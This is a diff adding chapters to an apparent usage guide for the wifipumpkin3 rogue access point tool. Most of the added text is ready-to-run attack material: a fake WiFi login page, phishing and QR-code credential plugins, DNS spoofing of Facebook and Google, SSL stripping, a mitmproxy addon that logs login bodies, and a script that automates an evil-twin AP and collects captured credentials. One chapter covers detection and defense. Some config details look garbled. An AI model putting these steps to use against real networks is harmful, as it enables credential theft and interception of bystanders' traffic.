@@ -482,6 +482,411 @@ sudo systemctl restart hostapd dnsmasq
 
 ---
 
+## Chapter 9: Captive Portal Deep Dive
+
+### captiveflask Portal Server
+
+captiveflask is the built-in captive portal server that uses Flask to serve phishing pages:
+
+```bash
+# Start with captive portal
+wifipumpkin3 -i wlan0 -iNet eth0
+
+# In interactive mode:
+# AP > Plugins > Captive Portal
+# Select portal template
+# Configure redirect URL
+```
+
+### Custom Portal Templates
+
+```bash
+# Portal templates location
+ls /usr/share/wifipumpkin3/
+
+# Create custom portal
+mkdir -p /tmp/custom_portal/
+cat > /tmp/custom_portal/index.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WiFi Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        .login-form { max-width: 300px; margin: 0 auto; }
+        input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; }
+        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <h2>Network Authentication Required</h2>
+    <form action="/login" method="POST">
+        <input type="password" name="password" placeholder="Enter WiFi Password" required>
+        <button type="submit">Connect</button>
+    </form>
+</body>
+</html>
+EOF
+```
+
+### phishkin3 External Phishing
+
+```bash
+# phishkin3 serves external phishing pages
+# Captures credentials from fake login pages
+
+# Start wifipumpkin3 with phishkin3
+wifipumpkin3 -i wlan0 -iNet eth0
+
+# In interactive menu:
+# AP > Plugins > Phishing (phishkin3)
+# Select phishing template (Facebook, Google, etc.)
+```
+
+### evilqr3 QR Code Phishing
+
+```bash
+# evilqr3 generates QR codes for WiFi credential phishing
+# Victims scan QR code, enter credentials on web page
+
+# Start with QR code phishing
+wifipumpkin3 -i wlan0 -iNet eth0
+
+# In interactive menu:
+# AP > Plugins > QR Code (evilqr3)
+# Configure SSID and password for QR code
+# Display QR code to victims
+```
+
+---
+
+## Chapter 10: DNS Spoofing Configuration
+
+### dnsmasq DNS Configuration
+
+```bash
+# Custom dnsmasq configuration for wifipumpkin3
+cat > /tmp/dnsmasq_custom.conf << 'EOF'
+# Listen on rogue AP interface
+interface=wlan0
+
+# DHCP range
+dhcp-range=192.168.1.10,192.168.1.200,255.255.255.0,12h
+
+# DNS spoofing - redirect all domains to attacker
+address=/#/192.168.1.1
+
+# Specific domain spoofing
+address=/facebook.com/192.168.1.100
+address=/google.com/192.168.1.100
+
+# DNS settings
+server=8.8.8.8
+server=8.8.4.4
+EOF
+
+sudo dnsmasq -C /tmp/dnsmasq_custom.conf
+```
+
+### Dnscrypt-proxy Integration
+
+```bash
+# Use dnscrypt-proxy for encrypted DNS with spoofing
+# Install
+sudo apt install dnscrypt-proxy
+
+# Configure for rogue AP
+cat > /etc/dnscrypt-proxy/dnscrypt-proxy.toml << 'EOF'
+listen_addresses = ['192.168.1.1:53']
+server_names = ['google', 'cloudflare']
+max_clients = 250
+ipv4_servers = true
+dnscrypt_servers = true
+
+[static]
+  [static.'malicious']
+  stamp = 'dnssec://...'
+EOF
+```
+
+---
+
+## Chapter 11: Transparent Proxy and Traffic Interception
+
+### sslstrip3 Integration
+
+```bash
+# sslstrip3 is a fork of sslstrip included with wifipumpkin3
+# Downgrades HTTPS to HTTP for credential capture
+
+# Start with SSL stripping
+wifipumpkin3 -i wlan0 -iNet eth0
+
+# In interactive menu:
+# AP > Proxies > SSLStrip3
+# Configure listening port
+```
+
+### mitmproxy Integration
+
+```bash
+# Use mitmproxy as transparent proxy
+wifipumpkin3 -i wlan0 -iNet eth0
+
+# In interactive menu:
+# AP > Proxies > mitmproxy
+# Configure interception rules
+# Set up Python scripts for automation
+```
+
+### Custom Proxy Scripts
+
+```python
+# /tmp/proxy_script.py - Custom mitmproxy addon
+from mitmproxy import http
+import json
+
+def request(flow: http.HTTPFlow):
+    # Log all requests
+    print(f"[REQUEST] {flow.request.method} {flow.request.url}")
+
+def response(flow: http.HTTPFlow):
+    # Capture login forms
+    if "login" in flow.request.url.lower():
+        body = flow.request.get_text()
+        print(f"[LOGIN CAPTURED] {flow.request.url}")
+        with open("/tmp/captured_logins.json", "a") as f:
+            f.write(json.dumps({
+                "url": flow.request.url,
+                "body": body,
+                "timestamp": flow.request.timestamp_start
+            }) + "\n")
+```
+
+### iptables Traffic Redirection
+
+```bash
+# Redirect all HTTP/HTTPS through proxy
+sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 \
+  -j REDIRECT --to-port 8080
+sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 \
+  -j REDIRECT --to-port 8080
+
+# NAT for internet sharing
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+# DNS hijacking
+sudo iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 \
+  -j REDIRECT --to-port 53
+```
+
+---
+
+## Chapter 12: RESTful API Reference
+
+### Authentication
+
+```bash
+# Start with REST API
+wifipumpkin3 --rest --restport 1337 --username admin --password secret
+
+# Authenticate
+curl -X POST http://localhost:1337/api/auth \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"secret"}'
+```
+
+### API Endpoints
+
+```bash
+# Get AP status
+curl -H "Authorization: Bearer <token>" http://localhost:1337/api/ap/status
+
+# Start rogue AP
+curl -X POST http://localhost:1337/api/ap/start \
+  -H "Authorization: Bearer <token>" \
+  -d '{"ssid":"FreeWiFi","channel":6,"interface":"wlan0"}'
+
+# Stop rogue AP
+curl -X POST http://localhost:1337/api/ap/stop \
+  -H "Authorization: Bearer <token>"
+
+# Get captured credentials
+curl -H "Authorization: Bearer <token>" http://localhost:1337/api/credentials
+
+# List connected clients
+curl -H "Authorization: Bearer <token>" http://localhost:1337/api/clients
+
+# Enable captive portal
+curl -X POST http://localhost:1337/api/plugin/enable \
+  -H "Authorization: Bearer <token>" \
+  -d '{"plugin":"captiveflask"}'
+```
+
+### Python Automation Script
+
+```python
+#!/usr/bin/env python3
+"""Automated wifipumpkin3 attack via REST API"""
+import requests
+import time
+
+API_URL = "http://localhost:1337"
+AUTH = {"username": "admin", "password": "secret"}
+
+# Authenticate
+session = requests.Session()
+token = session.post(f"{API_URL}/api/auth", json=AUTH).json()["token"]
+headers = {"Authorization": f"Bearer {token}"}
+
+# Start AP
+session.post(f"{API_URL}/api/ap/start", headers=headers, json={
+    "ssid": "FreeWiFi",
+    "channel": 6,
+    "interface": "wlan0"
+})
+
+# Enable captive portal
+session.post(f"{API_URL}/api/plugin/enable", headers=headers, json={
+    "plugin": "captiveflask"
+})
+
+# Monitor for credentials
+while True:
+    creds = session.get(f"{API_URL}/api/credentials", headers=headers).json()
+    if creds.get("data"):
+        for cred in creds["data"]:
+            print(f"[+] Credential: {cred}")
+    time.sleep(5)
+```
+
+---
+
+## Chapter 13: Detection and Defense
+
+### Detection Methods
+
+**Wireless-Level Detection:**
+- Rogue AP detection via 802.11 management frame analysis
+- Duplicate SSID detection with signal strength comparison
+- Beacon frame anomalies (timing, IE differences)
+- Deauthentication flood detection
+
+**Network-Level Detection:**
+- Unauthorized DHCP server detection
+- DNS query analysis for spoofing indicators
+- Captive portal detection via HTTP response analysis
+- Certificate transparency monitoring
+
+**Enterprise WIPS Detection:**
+```
+Wireless Intrusion Prevention Systems detect:
+- Evil twin APs via RF fingerprinting
+- Deauthentication floods
+- Unauthorized APs via managed AP database
+- Rogue DHCP servers
+```
+
+### Blue Team Countermeasures
+
+```bash
+# 1. Deploy WPA3-SAE (resistant to offline attacks)
+# Configure on enterprise APs:
+# wpa=3
+# wpa_key_mgmt=SAE
+# wpa_passphrase=StrongPassword
+
+# 2. Enable 802.11w (Protected Management Frames)
+# Prevents deauthentication attacks
+# hostapd.conf: ieee80211w=2
+
+# 3. Implement 802.1X authentication
+# Individual credentials, not shared PSK
+# RADIUS server integration
+
+# 4. Deploy wireless IDS/IPS
+# Monitor for rogue APs
+# Alert on deauth floods
+
+# 5. Client isolation on APs
+# Prevent client-to-client traffic
+# hostapd.conf: ap_isolate=1
+
+# 6. Certificate pinning in mobile apps
+# Prevent SSL stripping attacks
+
+# 7. User training
+# Educate about evil twin risks
+# Verify SSID before connecting
+```
+
+### Detection Script
+
+```bash
+#!/bin/bash
+# rogue_ap_detector.sh - Detect rogue access points
+INTERFACE="wlan0mon"
+
+# Scan for APs
+airodump-ng "$INTERFACE" --write /tmp/ap_scan --output-format csv 2>/dev/null &
+SCAN_PID=$!
+sleep 10
+kill $SCAN_PID 2>/dev/null
+
+# Analyze for duplicates
+echo "[*] Checking for duplicate SSIDs..."
+awk -F',' 'NR>1 {print $14}' /tmp/ap_scan-01.csv | sort | uniq -d | while read ssid; do
+    echo "[!] Duplicate SSID detected: $ssid"
+    grep "$ssid" /tmp/ap_scan-01.csv
+done
+
+# Check for deauth floods
+echo "[*] Checking for deauthentication floods..."
+timeout 5 tcpdump -i "$INTERFACE" -w /tmp/deauth_check.pcap type mgt subtype deauth 2>/dev/null
+tshark -r /tmp/deauth_check.pcap -Y "wlan.fc.type_subtype == 0x0c" 2>/dev/null | wc -l | \
+  xargs -I{} echo "[*] Deauth frames captured: {}"
+```
+
+---
+
+## Chapter 14: Performance Tuning
+
+### Optimizing Rogue AP
+
+```bash
+# Increase DHCP lease time for longer sessions
+# In dnsmasq config:
+dhcp-range=192.168.1.10,192.168.1.200,255.255.255.0,24h
+
+# Reduce beacon interval for faster client discovery
+# hostapd.conf: beacon_int=50
+
+# Optimize channel width
+# hostapd.conf: ht_capab=[HT40+][HT40-]
+# For 5GHz: channel_width=80
+
+# Increase max stations
+# hostapd.conf: max_num_sta=200
+```
+
+### System Resource Optimization
+
+```bash
+# Increase kernel network buffers
+sudo sysctl -w net.core.rmem_max=262144
+sudo sysctl -w net.core.wmem_max=262144
+sudo sysctl -w net.ipv4.tcp_rmem="4096 87380 262144"
+
+# Reduce logging for high-throughput
+# Disable verbose logging in wifipumpkin3
+
+# Use dedicated CPU cores for AP
+# taskset -c 0,1 wifipumpkin3 -i wlan0
+```
+
+---
+
 ## Resources
 
 - **GitHub:** https://github.com/P0cL4bs/wifipumpkin3
@@ -490,3 +895,5 @@ sudo systemctl restart hostapd dnsmasq
 - **Discord:** https://discord.gg/jywYskR
 - **Hostapd:** https://w1.fi/hostapd/
 - **dnsmasq:** http://www.thekelleys.org.uk/dnsmasq/doc.html
+- **IEEE 802.11 Standard:** https://standards.ieee.org/standard/802_11-2020.html
+- **OWASP Wireless Testing:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weak_Password_Policy
